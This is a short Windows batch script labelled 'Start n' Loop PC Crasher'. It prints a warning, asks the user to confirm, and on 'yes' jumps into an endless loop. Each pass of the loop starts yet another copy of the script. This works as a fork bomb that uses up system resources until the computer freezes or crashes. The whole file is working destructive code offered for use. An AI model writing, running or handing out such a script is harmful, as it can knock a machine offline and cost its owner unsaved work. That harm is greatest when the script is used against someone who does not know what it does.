@echo off
color c
title Start n' Loop
echo Start n' Loop PC Crasher
echo WARNING! THIS WILL COMPLETELY NUUKKE YOUR COMPUTER.
echo Do you want do proceed?
echo [1] Yes
echo [2] No
choice /c:12 /m "Choose an option: "
IF ERRORLEVEL 2 GOTO QUIT
IF ERRORLEVEL 1 GOTO NUUKKE
:NUUKKE
start start %~dp0\start_n'_loop.bat
goto NUUKKE
:QUIT
exit /b